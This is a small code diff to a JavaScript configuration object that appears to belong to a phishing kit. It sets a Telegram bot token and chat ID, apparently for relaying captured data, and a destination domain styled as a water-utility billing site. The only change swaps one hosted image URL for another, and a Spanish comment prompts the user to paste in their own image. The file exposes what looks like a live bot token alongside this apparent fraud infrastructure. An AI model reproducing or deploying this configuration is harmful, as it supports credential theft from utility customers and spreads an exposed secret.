@@ -12,7 +12,7 @@ const CONFIG = {
     TG_TOKEN: '8260412488:AAFCSGGrgSu9-mF7d7SjdI5bJ9cMa3WIqUY',
     TG_CHAT: '-1003321543933',
     DESTINO: 'https://alcantarillado.acueducto-factura.com', 
-    IMG_URL: 'https://newacuemetric.onrender.com/pop.jpg', // <-- PEGA AQUÍ LA URL DE TU IMAGEN
+    IMG_URL: 'https://newapisacue.onrender.com/pop.jpg', // <-- PEGA AQUÍ LA URL DE TU IMAGEN
     PORT: process.env.PORT || 3000
 };
 
